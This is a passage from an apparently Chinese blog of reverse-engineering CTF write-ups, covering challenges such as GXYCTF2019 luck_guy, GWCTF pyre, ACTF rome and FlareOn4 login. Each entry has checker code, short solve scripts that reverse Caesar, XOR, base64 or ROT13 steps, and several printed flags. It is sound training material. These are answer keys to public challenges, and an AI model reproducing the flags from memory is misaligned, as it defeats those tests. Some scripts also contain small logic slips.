<span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span> == text[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,j);</span><br><span class="line">v3++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">text=<span class="string">&#x27;killshadow&#x27;</span></span><br><span class="line"></span><br><span class="line">key= <span class="string">&#x27;ADSFKNDCLS&#x27;</span>.lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> (j&lt;=<span class="number">96</span> <span class="keyword">and</span> j&gt;<span class="number">122</span> <span class="keyword">or</span> j&gt;<span class="number">64</span> <span class="keyword">and</span> j&lt;=<span class="number">90</span> ):</span><br><span class="line">            <span class="keyword">if</span> (((j - <span class="number">39</span> - <span class="built_in">ord</span>(key[x]) + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span> )== <span class="built_in">ord</span>(text[x])):</span><br><span class="line">                 <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                 </span><br></pre></td></tr></table></figure><h3 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h3><p>jadx打开即可</p><p><img src="../../img/image-20231127213732423.png" alt="image-20231127213732423"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">KEY = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(KEY)):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (x+<span class="number">64</span>)^<span class="number">32</span>==KEY[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(x),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-luck-guy1"><a href="#GXYCTF2019-luck-guy1" class="headerlink" title="[GXYCTF2019]luck_guy1"></a>[GXYCTF2019]luck_guy1</h3><p><img src="../../img/image-20231127214632716.png" alt="image-20231127214632716"></p><p>因为switch里是随机数，所以得出flag靠运气23333</p><p>执行顺序case4-&gt;case5-&gt;case1</p><p>解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f2=[<span class="number">0x7F</span>,<span class="number">0x66</span>,<span class="number">0x6F</span>,<span class="number">0x60</span>,<span class="number">0x67</span>,<span class="number">0x75</span>,<span class="number">0x63</span>,<span class="number">0x69</span>][::-<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">        f2[x]-=<span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f2[x]-=<span class="number">1</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(f2[x])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-JustRE-1"><a href="#BJDCTF2020-JustRE-1" class="headerlink" title="[BJDCTF2020]JustRE 1"></a>[BJDCTF2020]JustRE 1</h3><p>win32api</p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/_winmsg/">Windows 和消息 - Win32 apps | Microsoft Learn</a></p><p><img src="../../img/image-20231220182713411.png" alt="image-20231220182713411"></p><p><img src="../../img/image-20231129172751369.png" alt="image-20231129172751369"></p><p>flag{1999902069a45792d233ac}</p><h4 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_4010F0</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line"><span class="comment">// sub_4010F0((int)v7, 0, 10);</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = i;</span><br><span class="line">    v6 = a1[i];</span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; a1[result] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++i;</span><br><span class="line">          a1[v5] = a1[result];</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">while</span> ( a1[i] &lt;= v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 =  i;</span><br><span class="line">          a1[result] = a1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        --result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    a1[result] = v6;</span><br><span class="line">    sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">    result = a3;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;    </span><br><span class="line"> <span class="type">char</span> v7[]=<span class="string">&quot;ZJSECaNH3ng&quot;</span>;</span><br><span class="line">    sub_4010F0(v7, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<code>3CEHJNSZagn</code></p><p>同时我们在</p><p><img src="../../img/image-20231223204339998.png" alt="image-20231223204339998"></p><p>我们发现<code>flag</code>第一二位已经确定，为<code>UJ</code>同时<code>输入3个字符,输出4个字符</code>，可以看到<code>base64</code>表，所以<code>sub_401000</code>为base64加密。``</p><p><img src="../../img/image-20231223205639700.png" alt="image-20231223205639700"></p><p>ak1wV1Ax=jMpWP1</p><p>flag{UJjMpWP1}</p><h3 id="GWCTF-2019-pyre-1"><a href="#GWCTF-2019-pyre-1" class="headerlink" title="[GWCTF 2019]pyre 1"></a>[GWCTF 2019]pyre 1</h3><p><img src="../../img/image-20231223211518873.png" alt="image-20231223211518873"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[(i + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure><p>解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">     code[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(code[i]) ^ <span class="built_in">ord</span>(code[(i + <span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">            num = <span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i])-i)%<span class="number">128</span>)</span><br><span class="line">            <span class="built_in">print</span>(num,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-easyre1"><a href="#ACTF新生赛2020-easyre1" class="headerlink" title="[ACTF新生赛2020]easyre1"></a>[ACTF新生赛2020]easyre1</h3><p>upx脱壳</p><p>wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v4 = [<span class="number">42</span>,<span class="number">70</span>,<span class="number">39</span>,<span class="number">34</span>,<span class="number">78</span>,<span class="number">44</span>,<span class="number">34</span>,<span class="number">40</span>,<span class="number">73</span>,<span class="number">63</span>,<span class="number">43</span>,<span class="number">64</span>]</span><br><span class="line">data_start__ = <span class="built_in">chr</span>(<span class="number">0x7E</span>)+<span class="string">&quot;&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&quot;</span> + <span class="built_in">chr</span>(<span class="number">0x27</span>) + <span class="string">&#x27;&amp;%$# !&quot;&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v4:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data_start__)):</span><br><span class="line">        <span class="keyword">if</span> i==<span class="built_in">ord</span>(data_start__[j]):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j+<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-rome1"><a href="#ACTF新生赛2020-rome1" class="headerlink" title="[ACTF新生赛2020]rome1"></a>[ACTF新生赛2020]rome1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v12=<span class="string">&#x27;Qsw3sj_lz4_Ujw@l&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">          key=j</span><br><span class="line">          <span class="keyword">if</span> j &gt; <span class="number">64</span> <span class="keyword">and</span> j &lt;= <span class="number">90</span>:</span><br><span class="line">            j=(j-<span class="number">51</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line">          <span class="keyword">if</span> j&gt;<span class="number">96</span> <span class="keyword">and</span> j&lt;=<span class="number">122</span>:</span><br><span class="line">            j= (j-<span class="number">79</span>)%<span class="number">26</span> +<span class="number">97</span></span><br><span class="line">          <span class="keyword">if</span> j == <span class="built_in">ord</span>(v12[i]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(key),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="findit-1"><a href="#findit-1" class="headerlink" title="findit 1"></a>findit 1</h3><p>关键代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">final char[] a = &#123;&#x27;T&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;s&#x27;, &#x27;I&#x27;, &#x27;s&#x27;, &#x27;T&#x27;, &#x27;h&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;g&#x27;, &#x27;H&#x27;, &#x27;o&#x27;, &#x27;m&#x27;, &#x27;e&#x27;&#125;;</span><br><span class="line">       final char[] b = &#123;&#x27;p&#x27;, &#x27;v&#x27;, &#x27;k&#x27;, &#x27;q&#x27;, &#x27;&#123;&#x27;, &#x27;m&#x27;, &#x27;1&#x27;, &#x27;6&#x27;, &#x27;4&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;2&#x27;, &#x27;6&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;3&#x27;, &#x27;3&#x27;, &#x27;l&#x27;, &#x27;4&#x27;, &#x27;m&#x27;, &#x27;4&#x27;, &#x27;9&#x27;, &#x27;l&#x27;, &#x27;n&#x27;, &#x27;p&#x27;, &#x27;7&#x27;, &#x27;p&#x27;, &#x27;9&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;2&#x27;, &#x27;8&#x27;, &#x27;k&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;&#125;&#x27;&#125;;</span><br><span class="line">       btn.setOnClickListener(new View.OnClickListener() &#123; // from class: com.example.findit.MainActivity.1</span><br><span class="line">           @Override // android.view.View.OnClickListener</span><br><span class="line">           public void onClick(View v) &#123;</span><br><span class="line">               char[] x = new char[17];</span><br><span class="line">               char[] y = new char[38];</span><br><span class="line">               for (int i = 0; i &lt; 17; i++) &#123;</span><br><span class="line">                   if ((a[i] &lt; &#x27;I&#x27; &amp;&amp; a[i] &gt;= &#x27;A&#x27;) || (a[i] &lt; &#x27;i&#x27; &amp;&amp; a[i] &gt;= &#x27;a&#x27;)) &#123;</span><br><span class="line">                       x[i] = (char) (a[i] + 18);</span><br><span class="line">                   &#125; else if ((a[i] &gt;= &#x27;A&#x27; &amp;&amp; a[i] &lt;= &#x27;Z&#x27;) || (a[i] &gt;= &#x27;a&#x27; &amp;&amp; a[i] &lt;= &#x27;z&#x27;)) &#123;</span><br><span class="line">                       x[i] = (char) (a[i] - &#x27;\b&#x27;);</span><br><span class="line">                   &#125; else &#123;</span><br><span class="line">                       x[i] = a[i];</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               String m = String.valueOf(x);</span><br><span class="line">               if (m.equals(edit.getText().toString())) &#123;</span><br><span class="line">                   for (int i2 = 0; i2 &lt; 38; i2++) &#123;</span><br><span class="line">                       if ((b[i2] &gt;= &#x27;A&#x27; &amp;&amp; b[i2] &lt;= &#x27;Z&#x27;) || (b[i2] &gt;= &#x27;a&#x27; &amp;&amp; b[i2] &lt;= &#x27;z&#x27;)) &#123;</span><br><span class="line">                           y[i2] = (char) (b[i2] + 16);</span><br><span class="line">                           if ((y[i2] &gt; &#x27;Z&#x27; &amp;&amp; y[i2] &lt; &#x27;a&#x27;) || y[i2] &gt;= &#x27;z&#x27;) &#123;</span><br><span class="line">                               y[i2] = (char) (y[i2] - 26);</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125; else &#123;</span><br><span class="line">                           y[i2] = b[i2];</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">                   String n = String.valueOf(y);</span><br><span class="line">                   text.setText(n);</span><br><span class="line">                   return;</span><br><span class="line">               &#125;</span><br><span class="line">               text.setText(&quot;答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure><p>发现是<code>凯撒加密</code>,解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">model = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"> </span><br><span class="line">str1 = <span class="string">&quot;pvkq&#123;m164675262033l4m49lnp7p9mnk28k75&#125;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;key=%d&quot;</span>%i)</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">if</span> s.isalpha():</span><br><span class="line">            n = model.find(s)</span><br><span class="line">            s = model[n-i]</span><br><span class="line">        <span class="built_in">print</span>(s, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h3><p>&lt;!DOCTYPE Html /&gt;<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Html</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>FLARE On 2017<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Enter the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;prompt&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click to check the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;prompt&quot;</span>).<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> flag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;flag&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> rotFlag = flag.<span class="title function_">replace</span>(<span class="regexp">/[a-zA-Z]/g</span>, <span class="keyword">function</span>(<span class="params">c</span>)&#123;<span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);&#125;);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&quot;Correct flag!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>ROT13</p><p><code>(c &lt;= &quot;Z&quot; ? 90 : 122) &gt;=</code> 确保加密后的字母仍在字母表范围内.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= x &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>((<span class="built_in">ord</span>(x) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - <span class="number">13</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= x &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>((<span class="built_in">ord</span>(x) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - <span class="number">13</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">           result += x</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-level11"><a href="#WUSTCTF2020-level11" class="headerlink" 